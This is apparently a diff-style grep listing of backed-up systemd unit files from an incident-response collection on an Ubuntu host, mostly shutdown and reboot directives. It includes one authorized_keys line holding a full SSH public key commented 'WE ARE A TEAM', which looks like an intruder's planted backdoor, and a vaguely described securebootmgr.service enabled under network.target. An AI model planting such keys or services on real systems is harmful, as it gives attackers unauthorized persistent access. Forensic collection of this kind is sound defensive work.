+/root/ir-resume-2026-04-18-151238/system/multi-user.target.wants/nginx.service:6:# and sends SIGTERM (fast shutdown) to the main process.
+/root/ir-resume-2026-04-18-151238/system/multi-user.target.wants/ua-reboot-cmds.service:2:# is required immediately after the next reboot.
+/root/ir-resume-2026-04-18-151238/system/multi-user.target.wants/ua-reboot-cmds.service:9:Description=Ubuntu Pro reboot cmds
+/root/ir-resume-2026-04-18-151238/system/multi-user.target.wants/ua-reboot-cmds.service:10:ConditionPathExists=|/var/lib/ubuntu-advantage/marker-reboot-cmds-required
+/root/ir-resume-2026-04-18-151238/system/multi-user.target.wants/ua-reboot-cmds.service:17:ExecStart=/usr/bin/python3 /usr/lib/ubuntu-advantage/reboot_cmds.py
+/root/ir-resume-2026-04-18-151238/system/multi-user.target.wants/auditd.service:11:Before=sysinit.target shutdown.target
+/root/ir-resume-2026-04-18-151238/system/multi-user.target.wants/auditd.service:12:##Before=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/multi-user.target.wants/auditd.service:13:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/multi-user.target.wants/secureboot-db.service:10:ExecStart=/usr/bin/sbkeysync --no-default-keystores --keystore /usr/share/secureboot/updates --verbose
+/root/ir-resume-2026-04-18-151238/system/multi-user.target.wants/systemd-update-utmp-runlevel.service:17:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/multi-user.target.wants/systemd-update-utmp-runlevel.service:21:Before=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/multi-user.target.wants/unattended-upgrades.service:2:Description=Unattended Upgrades Shutdown
+/root/ir-resume-2026-04-18-151238/system/multi-user.target.wants/unattended-upgrades.service:8:ExecStart=/usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
+/root/ir-resume-2026-04-18-151238/system/multi-user.target.wants/systemd-logind.service:55:RuntimeDirectory=systemd/sessions systemd/seats systemd/users systemd/inhibit systemd/shutdown
+/root/ir-resume-2026-04-18-151238/system/system-update-cleanup.service:15:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/system-update-cleanup.service:16:Before=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/system-update-cleanup.service:17:SuccessAction=reboot
+/root/ir-resume-2026-04-18-151238/system/system-update-cleanup.service:25:# would be diverted into system-update.target again after reboot. This way
+/root/ir-resume-2026-04-18-151238/system/system-update-cleanup.service:29:# reboot or some other action on its own.
+/root/ir-resume-2026-04-18-151238/system/plymouth-halt.service:2:Description=Show Plymouth Halt Screen
+/root/ir-resume-2026-04-18-151238/system/plymouth-halt.service:4:Before=systemd-halt.service
+/root/ir-resume-2026-04-18-151238/system/plymouth-halt.service:12:ExecStart=/usr/sbin/plymouthd --mode=shutdown --attach-to-session
+/root/ir-resume-2026-04-18-151238/system/systemd-soft-reboot.service:11:Description=Reboot System Userspace
+/root/ir-resume-2026-04-18-151238/system/systemd-soft-reboot.service:12:Documentation=man:systemd-soft-reboot.service(8)
+/root/ir-resume-2026-04-18-151238/system/systemd-soft-reboot.service:14:Requires=shutdown.target umount.target final.target
+/root/ir-resume-2026-04-18-151238/system/systemd-soft-reboot.service:15:After=shutdown.target umount.target final.target
+/root/ir-resume-2026-04-18-151238/system/systemd-soft-reboot.service:16:SuccessAction=soft-reboot-force
+/root/ir-resume-2026-04-18-151238/system/dbus-org.freedesktop.timesync1.service:17:Before=time-set.target sysinit.target shutdown.target
+/root/ir-resume-2026-04-18-151238/system/dbus-org.freedesktop.timesync1.service:18:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/systemd-ask-password-plymouth.path:5:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/systemd-ask-password-plymouth.path:7:Before=basic.target shutdown.target
+/root/ir-resume-2026-04-18-151238/system/systemd-pcrphase-initrd.service:14:Conflicts=shutdown.target initrd-switch-root.target
+/root/ir-resume-2026-04-18-151238/system/systemd-pcrphase-initrd.service:15:Before=sysinit.target cryptsetup-pre.target cryptsetup.target shutdown.target initrd-switch-root.target systemd-sysext.service
+/root/ir-resume-2026-04-18-151238/system/reboot.target.wants/plymouth-switch-root-initramfs.service:4:# dracut-shutdown.service restores the initramfs when it is _stopped_
+/root/ir-resume-2026-04-18-151238/system/reboot.target.wants/plymouth-switch-root-initramfs.service:6:Conflicts=dracut-shutdown.service
+/root/ir-resume-2026-04-18-151238/system/reboot.target.wants/plymouth-switch-root-initramfs.service:7:After=plymouth-halt.service plymouth-reboot.service plymouth-poweroff.service plymouth-kexec.service dracut-shutdown.service mkinitcpio-generate-shutdown-ramfs.service
+/root/ir-resume-2026-04-18-151238/system/reboot.target.wants/plymouth-switch-root-initramfs.service:9:ConditionPathExists=|/run/initramfs/shutdown
+/root/ir-resume-2026-04-18-151238/system/reboot.target.wants/plymouth-reboot.service:2:Description=Show Plymouth Reboot Screen
+/root/ir-resume-2026-04-18-151238/system/reboot.target.wants/plymouth-reboot.service:4:Before=systemd-reboot.service
+/root/ir-resume-2026-04-18-151238/system/reboot.target.wants/plymouth-reboot.service:12:ExecStart=/usr/sbin/plymouthd --mode=reboot --attach-to-session
+/root/ir-resume-2026-04-18-151238/system/rescue.service:14:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/rescue.service:16:Before=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/initrd-root-device.target:17:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/secureboot-db.service:10:ExecStart=/usr/bin/sbkeysync --no-default-keystores --keystore /usr/share/secureboot/updates --verbose
+/root/ir-resume-2026-04-18-151238/system/poweroff.target.wants/plymouth-poweroff.service:4:Before=systemd-poweroff.service
+/root/ir-resume-2026-04-18-151238/system/poweroff.target.wants/plymouth-poweroff.service:12:ExecStart=/usr/sbin/plymouthd --mode=shutdown --attach-to-session
+/root/ir-resume-2026-04-18-151238/system/poweroff.target.wants/plymouth-switch-root-initramfs.service:4:# dracut-shutdown.service restores the initramfs when it is _stopped_
+/root/ir-resume-2026-04-18-151238/system/poweroff.target.wants/plymouth-switch-root-initramfs.service:6:Conflicts=dracut-shutdown.service
+/root/ir-resume-2026-04-18-151238/system/poweroff.target.wants/plymouth-switch-root-initramfs.service:7:After=plymouth-halt.service plymouth-reboot.service plymouth-poweroff.service plymouth-kexec.service dracut-shutdown.service mkinitcpio-generate-shutdown-ramfs.service
+/root/ir-resume-2026-04-18-151238/system/poweroff.target.wants/plymouth-switch-root-initramfs.service:9:ConditionPathExists=|/run/initramfs/shutdown
+/root/ir-resume-2026-04-18-151238/system/initrd-usr-fs.target:17:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/iscsid.service:8:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/iscsid.service:9:Before=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/systemd-update-utmp-runlevel.service:17:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/systemd-update-utmp-runlevel.service:21:Before=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/cloud-config.target.wants/cloud-init-hotplugd.socket:9:Before=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/cloud-config.target.wants/cloud-init-hotplugd.socket:10:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/systemd-confext.service:23:Conflicts=shutdown.target initrd-switch-root.target
+/root/ir-resume-2026-04-18-151238/system/systemd-confext.service:24:Before=shutdown.target initrd-switch-root.target
+/root/ir-resume-2026-04-18-151238/system/systemd-halt.service:11:Description=System Halt
+/root/ir-resume-2026-04-18-151238/system/systemd-halt.service:12:Documentation=man:systemd-halt.service(8)
+/root/ir-resume-2026-04-18-151238/system/systemd-halt.service:14:Requires=shutdown.target umount.target final.target
+/root/ir-resume-2026-04-18-151238/system/systemd-halt.service:15:After=shutdown.target umount.target final.target
+/root/ir-resume-2026-04-18-151238/system/systemd-halt.service:16:SuccessAction=halt-force
+/root/ir-resume-2026-04-18-151238/system/kmod.service:14:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/kmod.service:15:Before=sysinit.target shutdown.target
+/root/ir-resume-2026-04-18-151238/system/dbus-org.freedesktop.login1.service:55:RuntimeDirectory=systemd/sessions systemd/seats systemd/users systemd/inhibit systemd/shutdown
+/root/ir-resume-2026-04-18-151238/system/postgresql@.service:13:# stop server before networking goes down on shutdown
+/root/ir-resume-2026-04-18-151238/system/cloud-init.service:16:Before=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/cloud-init.service:17:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/systemd-sysupdate-reboot.timer:11:Description=Reboot Automatically After System Update
+/root/ir-resume-2026-04-18-151238/system/systemd-sysupdate-reboot.timer:12:Documentation=man:systemd-sysupdate-reboot.service(8)
+/root/ir-resume-2026-04-18-151238/system/emergency.service:14:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/emergency.service:16:Before=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/timers.target:15:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/systemd-random-seed.service:22:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/systemd-random-seed.service:23:Before=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/unattended-upgrades.service:2:Description=Unattended Upgrades Shutdown
+/root/ir-resume-2026-04-18-151238/system/unattended-upgrades.service:8:ExecStart=/usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
+/root/ir-resume-2026-04-18-151238/system/systemd-reboot.service:11:Description=System Reboot
+/root/ir-resume-2026-04-18-151238/system/systemd-reboot.service:12:Documentation=man:systemd-reboot.service(8)
+/root/ir-resume-2026-04-18-151238/system/systemd-reboot.service:14:Requires=shutdown.target umount.target final.target
+/root/ir-resume-2026-04-18-151238/system/systemd-reboot.service:15:After=shutdown.target umount.target final.target
+/root/ir-resume-2026-04-18-151238/system/systemd-reboot.service:16:SuccessAction=reboot-force
+/root/ir-resume-2026-04-18-151238/system/systemd-tpm2-setup.service:14:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/systemd-tpm2-setup.service:16:Before=sysinit.target shutdown.target
+/root/ir-resume-2026-04-18-151238/system/fwupd-offline-update.service:8:Before=shutdown.target system-update.target
+/root/ir-resume-2026-04-18-151238/system/fwupd-offline-update.service:13:FailureAction=reboot
+/root/ir-resume-2026-04-18-151238/system/lvm2-lvmpolld.socket:5:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/local-fs.target:16:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/systemd-quotacheck.service:19:Before=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/systemd-battery-check.service:25:FailureAction=poweroff-force
+/root/ir-resume-2026-04-18-151238/system/systemd-ask-password-console.service:20:Conflicts=shutdown.target initrd-switch-root.target
+/root/ir-resume-2026-04-18-151238/system/systemd-ask-password-console.service:21:Before=shutdown.target initrd-switch-root.target
+/root/ir-resume-2026-04-18-151238/system/dbus-org.freedesktop.resolve1.service:19:Before=sysinit.target network.target nss-lookup.target shutdown.target initrd-switch-root.target
+/root/ir-resume-2026-04-18-151238/system/dbus-org.freedesktop.resolve1.service:20:Conflicts=shutdown.target initrd-switch-root.target
+/root/ir-resume-2026-04-18-151238/system/poweroff.target:14:Requires=systemd-poweroff.service
+/root/ir-resume-2026-04-18-151238/system/poweroff.target:15:After=systemd-poweroff.service
+/root/ir-resume-2026-04-18-151238/system/poweroff.target:18:JobTimeoutAction=poweroff-force
+/root/ir-resume-2026-04-18-151238/system/packagekit-offline-update.service:7:Before=shutdown.target system-update.target
+/root/ir-resume-2026-04-18-151238/system/packagekit-offline-update.service:15:FailureAction=reboot
+/root/ir-resume-2026-04-18-151238/system/systemd-sysctl.service:14:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/systemd-sysctl.service:16:Before=sysinit.target shutdown.target
+/root/ir-resume-2026-04-18-151238/system/blk-availability.service:3:Before=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/blk-availability.service:4:After=iscsi-shutdown.service iscsi.service iscsid.service fcoe.service rbdmap.service
+/root/ir-resume-2026-04-18-151238/system/blk-availability.service:6:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/lvm2-monitor.service:6:Before=local-fs-pre.target shutdown.target
+/root/ir-resume-2026-04-18-151238/system/lvm2-monitor.service:8:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/systemd-pcrlock-machine-id.service:14:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/systemd-pcrlock-machine-id.service:15:Before=sysinit.target shutdown.target systemd-pcrlock-make-policy.service
+/root/ir-resume-2026-04-18-151238/system/systemd-growfs@.service:17:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/systemd-growfs@.service:18:Before=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/systemd-pcrmachine.service:14:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/systemd-pcrmachine.service:15:Before=sysinit.target shutdown.target
+/root/ir-resume-2026-04-18-151238/system/systemd-storagetm.service:17:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/systemd-storagetm.service:18:Before=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/systemd-storagetm.service:19:FailureAction=reboot
+/root/ir-resume-2026-04-18-151238/system/systemd-storagetm.service:20:SuccessAction=reboot
+/root/ir-resume-2026-04-18-151238/system/systemd-time-wait-sync.service:25:Before=time-sync.target shutdown.target
+/root/ir-resume-2026-04-18-151238/system/systemd-time-wait-sync.service:27:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/systemd-poweroff.service:12:Documentation=man:systemd-poweroff.service(8)
+/root/ir-resume-2026-04-18-151238/system/systemd-poweroff.service:14:Requires=shutdown.target umount.target final.target
+/root/ir-resume-2026-04-18-151238/system/systemd-poweroff.service:15:After=shutdown.target umount.target final.target
+/root/ir-resume-2026-04-18-151238/system/systemd-poweroff.service:16:SuccessAction=poweroff-force
+/root/ir-resume-2026-04-18-151238/system/systemd-pcrextend@.service:14:Conflicts=shutdown.target initrd-switch-root.target
+/root/ir-resume-2026-04-18-151238/system/systemd-pcrextend@.service:15:Before=shutdown.target initrd-switch-root.target
+/root/ir-resume-2026-04-18-151238/system/remote-veritysetup.target:15:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/systemd-boot-check-no-failures.service:15:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/systemd-boot-check-no-failures.service:16:Before=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/systemd-sysext.service:23:Conflicts=shutdown.target initrd-switch-root.target
+/root/ir-resume-2026-04-18-151238/system/systemd-sysext.service:24:Before=shutdown.target initrd-switch-root.target
+/root/ir-resume-2026-04-18-151238/system/systemd-volatile-root.service:14:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/systemd-volatile-root.service:16:Before=initrd-root-fs.target shutdown.target
+/root/ir-resume-2026-04-18-151238/system/graphical.target.wants/systemd-update-utmp-runlevel.service:17:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/graphical.target.wants/systemd-update-utmp-runlevel.service:21:Before=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/systemd-repart.service:26:Conflicts=shutdown.target initrd-switch-root.target
+/root/ir-resume-2026-04-18-151238/system/systemd-repart.service:27:Before=shutdown.target initrd-switch-root.target
+/root/ir-resume-2026-04-18-151238/system/systemd-fsck-root.service:14:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/systemd-fsck-root.service:15:Before=local-fs.target shutdown.target
+/root/ir-resume-2026-04-18-151238/system/runlevel0.target:14:Requires=systemd-poweroff.service
+/root/ir-resume-2026-04-18-151238/system/runlevel0.target:15:After=systemd-poweroff.service
+/root/ir-resume-2026-04-18-151238/system/runlevel0.target:18:JobTimeoutAction=poweroff-force
+/root/ir-resume-2026-04-18-151238/system/kexec.target.wants/plymouth-switch-root-initramfs.service:4:# dracut-shutdown.service restores the initramfs when it is _stopped_
+/root/ir-resume-2026-04-18-151238/system/kexec.target.wants/plymouth-switch-root-initramfs.service:6:Conflicts=dracut-shutdown.service
+/root/ir-resume-2026-04-18-151238/system/kexec.target.wants/plymouth-switch-root-initramfs.service:7:After=plymouth-halt.service plymouth-reboot.service plymouth-poweroff.service plymouth-kexec.service dracut-shutdown.service mkinitcpio-generate-shutdown-ramfs.service
+/root/ir-resume-2026-04-18-151238/system/kexec.target.wants/plymouth-switch-root-initramfs.service:9:ConditionPathExists=|/run/initramfs/shutdown
+/root/ir-resume-2026-04-18-151238/system/kexec.target.wants/plymouth-kexec.service:2:Description=Show Plymouth Reboot with kexec Screen
+/root/ir-resume-2026-04-18-151238/system/kexec.target.wants/plymouth-kexec.service:12:ExecStart=/usr/sbin/plymouthd --mode=shutdown --attach-to-session
+/root/ir-resume-2026-04-18-151238/system/cloud-init-hotplugd.socket:9:Before=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/cloud-init-hotplugd.socket:10:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/nm-priv-helper.service:66:SystemCallFilter=~@reboot
+/root/ir-resume-2026-04-18-151238/system/initrd-root-fs.target:17:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/mdmon@.service:29:# with shutdown, causing mdmon to exit early.  So use system.slice.
+/root/ir-resume-2026-04-18-151238/system/syslog.socket:18:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/syslog.socket:19:Before=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/ldconfig.service:20:Conflicts=shutdown.target initrd-switch-root.target
+/root/ir-resume-2026-04-18-151238/system/ldconfig.service:21:Before=shutdown.target initrd-switch-root.target
+/root/ir-resume-2026-04-18-151238/system/systemd-tmpfiles-setup.service:17:Conflicts=shutdown.target initrd-switch-root.target
+/root/ir-resume-2026-04-18-151238/system/systemd-tmpfiles-setup.service:18:Before=shutdown.target initrd-switch-root.target
+/root/ir-resume-2026-04-18-151238/system/network.target.wants/securebootmgr.service:2:Description=Service Unit File - securebootmgr.service
+/root/ir-resume-2026-04-18-151238/system/systemd-logind.service:55:RuntimeDirectory=systemd/sessions systemd/seats systemd/users systemd/inhibit systemd/shutdown
+/root/ir-resume-2026-04-18-151238/system/systemd-pcrphase.service:22:ExecStop=/usr/lib/systemd/systemd-pcrextend --graceful shutdown
+/root/ir-resume-2026-04-18-151238/system/systemd-update-utmp.service:11:Description=Record System Boot/Shutdown in UTMP
+/root/ir-resume-2026-04-18-151238/system/systemd-update-utmp.service:18:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/systemd-update-utmp.service:19:Before=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/systemd-update-utmp.service:25:ExecStart=/usr/lib/systemd/systemd-update-utmp reboot
+/root/ir-resume-2026-04-18-151238/system/systemd-update-utmp.service:26:ExecStop=/usr/lib/systemd/systemd-update-utmp shutdown
+/root/ir-resume-2026-04-18-151238/system/friendly-recovery.target:6:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/user@.service.d/timeout.conf:1:# Avoid long hangs during shutdown if user services fail/hang due to X.org
+/root/ir-resume-2026-04-18-151238/system/systemd-networkd-wait-online@.service:15:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/systemd-networkd-wait-online@.service:18:Before=network-online.target shutdown.target
+/root/ir-resume-2026-04-18-151238/system/systemd-kexec.service:11:Description=Reboot via kexec
+/root/ir-resume-2026-04-18-151238/system/systemd-kexec.service:14:Requires=shutdown.target umount.target final.target
+/root/ir-resume-2026-04-18-151238/system/systemd-kexec.service:15:After=shutdown.target umount.target final.target
+/root/ir-resume-2026-04-18-151238/system/systemd-pcrlock-secureboot-policy.service:11:Description=Lock UEFI SecureBoot Policy to TPM2 PCR Policy
+/root/ir-resume-2026-04-18-151238/system/systemd-pcrlock-secureboot-policy.service:14:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/systemd-pcrlock-secureboot-policy.service:16:Before=sysinit.target shutdown.target systemd-pcrlock-make-policy.service
+/root/ir-resume-2026-04-18-151238/system/systemd-pcrlock-secureboot-policy.service:23:ExecStart=/usr/lib/systemd/systemd-pcrlock lock-secureboot-policy
+/root/ir-resume-2026-04-18-151238/system/systemd-bsod.service:16:Before=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/systemd-bsod.service:17:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/network-online.target.wants/systemd-networkd-wait-online.service:15:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/network-online.target.wants/systemd-networkd-wait-online.service:18:Before=network-online.target shutdown.target
+/root/ir-resume-2026-04-18-151238/system/plymouth-reboot.service:2:Description=Show Plymouth Reboot Screen
+/root/ir-resume-2026-04-18-151238/system/plymouth-reboot.service:4:Before=systemd-reboot.service
+/root/ir-resume-2026-04-18-151238/system/plymouth-reboot.service:12:ExecStart=/usr/sbin/plymouthd --mode=reboot --attach-to-session
+/root/ir-resume-2026-04-18-151238/system/rescue.target.wants/systemd-update-utmp-runlevel.service:17:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/rescue.target.wants/systemd-update-utmp-runlevel.service:21:Before=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/systemd-pcrlock-firmware-config.service:14:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/systemd-pcrlock-firmware-config.service:16:Before=sysinit.target shutdown.target systemd-pcrlock-make-policy.service
+/root/ir-resume-2026-04-18-151238/system/systemd-machine-id-commit.service:14:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/systemd-machine-id-commit.service:15:Before=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/systemd-tmpfiles-setup-dev.service:18:Conflicts=shutdown.target initrd-switch-root.target
+/root/ir-resume-2026-04-18-151238/system/systemd-tmpfiles-setup-dev.service:19:Before=shutdown.target initrd-switch-root.target
+/root/ir-resume-2026-04-18-151238/system/halt.target.wants/plymouth-switch-root-initramfs.service:4:# dracut-shutdown.service restores the initramfs when it is _stopped_
+/root/ir-resume-2026-04-18-151238/system/halt.target.wants/plymouth-switch-root-initramfs.service:6:Conflicts=dracut-shutdown.service
+/root/ir-resume-2026-04-18-151238/system/halt.target.wants/plymouth-switch-root-initramfs.service:7:After=plymouth-halt.service plymouth-reboot.service plymouth-poweroff.service plymouth-kexec.service dracut-shutdown.service mkinitcpio-generate-shutdown-ramfs.service
+/root/ir-resume-2026-04-18-151238/system/halt.target.wants/plymouth-switch-root-initramfs.service:9:ConditionPathExists=|/run/initramfs/shutdown
+/root/ir-resume-2026-04-18-151238/system/halt.target.wants/plymouth-halt.service:2:Description=Show Plymouth Halt Screen
+/root/ir-resume-2026-04-18-151238/system/halt.target.wants/plymouth-halt.service:4:Before=systemd-halt.service
+/root/ir-resume-2026-04-18-151238/system/halt.target.wants/plymouth-halt.service:12:ExecStart=/usr/sbin/plymouthd --mode=shutdown --attach-to-session
+/root/ir-resume-2026-04-18-151238/system/systemd-rfkill.socket:18:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/systemd-rfkill.socket:19:Before=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/systemd-timesyncd.service:17:Before=time-set.target sysinit.target shutdown.target
+/root/ir-resume-2026-04-18-151238/system/systemd-timesyncd.service:18:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/procps.service:14:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/procps.service:16:Before=sysinit.target shutdown.target
+/root/ir-resume-2026-04-18-151238/system/systemd-tpm2-setup-early.service:14:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/systemd-tpm2-setup-early.service:15:Before=sysinit.target shutdown.target
+/root/ir-resume-2026-04-18-151238/system/systemd-ask-password-console.path:21:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/systemd-ask-password-console.path:22:Before=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/halt.target:11:Description=System Halt
+/root/ir-resume-2026-04-18-151238/system/halt.target:14:Requires=systemd-halt.service
+/root/ir-resume-2026-04-18-151238/system/halt.target:15:After=systemd-halt.service
+/root/ir-resume-2026-04-18-151238/system/systemd-resolved.service:19:Before=sysinit.target network.target nss-lookup.target shutdown.target initrd-switch-root.target
+/root/ir-resume-2026-04-18-151238/system/systemd-resolved.service:20:Conflicts=shutdown.target initrd-switch-root.target
+/root/ir-resume-2026-04-18-151238/system/runlevel6.target:11:Description=System Reboot
+/root/ir-resume-2026-04-18-151238/system/runlevel6.target:14:Requires=systemd-reboot.service
+/root/ir-resume-2026-04-18-151238/system/runlevel6.target:15:After=systemd-reboot.service
+/root/ir-resume-2026-04-18-151238/system/runlevel6.target:18:JobTimeoutAction=reboot-force
+/root/ir-resume-2026-04-18-151238/system/systemd-journald.service:18:# To avoid journald SIGKILLed during soft-reboot and corrupting journals.
+/root/ir-resume-2026-04-18-151238/system/systemd-journald.service:20:Before=soft-reboot.target
+/root/ir-resume-2026-04-18-151238/system/systemd-journald.service:21:Conflicts=soft-reboot.target
+/root/ir-resume-2026-04-18-151238/authorized_keys:1:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCVezQoQgcKB58jMG4dhFNtRM8KMkkBLZQ8sb3+pR2VP6wXxRB857hO5R8i/dbD9swgRbsgG04yLDzLZ7M12o+4SCpENefdQos7aFuocCF5NRQDrEaTtWG+LsAi9lIB43dKzRnhWJ/ETZ8hw1x0R6wcbTZ2YSpYVCcNRz9i0LtMtFqFXgleep3e23Uem1uPEPhreynPDxIWIfnyK9Fwpo3z/hdtICrC7EMOV1G44CI37SvlZCxvSDRkHe3dn4T3DsxiL/dLk4T4OfFmfMHqYhlGFMMypY5n5Q/zjivAj0ul7ymjc8RSvL2744TnzqSQ7L+GdtS4cNhUOdDPJ3IxpJxW5c8gP/J5Ue7XH/hVFrD+lQx6W5h1V4BZ7HhDvsVfBSuP0i7MClzsafVYjp1nFg6uelo6rqJ5eB64pESygPM9tCHJV3LaCNRFvJo1mExkVpQ99LGm/qa5fz1AtKdELafSatzaBy9CfZBdWjN1uKQnLvGvQhBoDQVpTbEsisCCqxPlzsnFaworvtoM6Ap4bB6jpPZsxPgdJNe5HT+lJfREiw8M20L4j6SVrPaRe/Blxpq48hfRAhvU8t+PmbQFbKC4Lc1ECUIi8gCJ5EpNeFszyx2OCFDPboss3gkXNDSJWF51DAhRV2CgkMyRc0gmYrmBCLy/4FMG1XpCLp73kL/gbQ== WE ARE A TEAM
+/root/ir-resume-2026-04-18-155542/system/initrd-fs.target:18:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-155542/system/soft-reboot.target:11:Description=Reboot System Userspace
+/root/ir-resume-2026-04-18-155542/system/soft-reboot.target:14:Requires=systemd-soft-reboot.service
+/root/ir-resume-2026-04-18-155542/system/soft-reboot.target:15:After=systemd-soft-reboot.service
+/root/ir-resume-2026-04-18-155542/system/soft-reboot.target:18:JobTimeoutAction=soft-reboot-force
+/root/ir-resume-2026-04-18-155542/system/system-update.target.wants/fwupd-offline-update.service:8:Before=shutdown.target system-update.target
+/root/ir-resume-2026-04-18-155542/system/system-update.target.wants/fwupd-offline-update.service:13:FailureAction=reboot
+/root/ir-resume-2026-04-18-155542/system/system-update.target.wants/packagekit-offline-update.service:7:Before=shutdown.target system-update.target
+/root/ir-resume-2026-04-18-155542/system/system-update.target.wants/packagekit-offline-update.service:15:FailureAction=reboot
+/root/ir-resume-2026-04-18-155542/system/cloud-init-local.service:9:Before=shutdown.target
+/root/ir-resume-2026-04-18-155542/system/cloud-init-local.service:11:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-155542/system/dm-event.service:6:Before=local-fs-pre.target shutdown.target
+/root/ir-resume-2026-04-18-155542/system/dm-event.service:7:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-155542/system/systemd-backlight@.service:16:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-155542/system/systemd-backlight@.service:17:Before=sysinit.target shutdown.target
+/root/ir-resume-2026-04-18-155542/system/systemd-sysusers.service:22:Conflicts=shutdown.target initrd-switch-root.target
+/root/ir-resume-2026-04-18-155542/system/systemd-sysusers.service:23:Before=shutdown.target initrd-switch-root.target
+/root/ir-resume-2026-04-18-155542/system/final.target:11:Description=Late Shutdown Services
+/root/ir-resume-2026-04-18-155542/system/final.target:15:After=shutdown.target umount.target
+/root/ir-resume-2026-04-18-155542/system/systemd-pcrlock-firmware-code.service:14:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-155542/system/systemd-pcrlock-firmware-code.service:16:Before=sysinit.target shutdown.target systemd-pcrlock-make-policy.service
+/root/ir-resume-2026-04-18-155542/system/systemd-pcrlock-secureboot-authority.service:11:Description=Lock UEFI SecureBoot Authority to TPM2 PCR Policy
+/root/ir-resume-2026-04-18-155542/system/systemd-pcrlock-secureboot-authority.service:14:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-155542/system/systemd-pcrlock-secureboot-authority.service:16:Before=sysinit.target shutdown.target systemd-pcrlock-make-policy.service
+/root/ir-resume-2026-04-18-155542/system/systemd-pcrlock-secureboot-authority.service:23:ExecStart=/usr/lib/systemd/systemd-pcrlock lock-secureboot-authority
+/root/ir-resume-2026-04-18-155542/system/dbus.socket:3:# Do not stop on shutdown
+/root/ir-resume-2026-04-18-155542/system/systemd-networkd-wait-online.service:15:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-155542/system/systemd-networkd-wait-online.service:18:Before=network-online.target shutdown.target
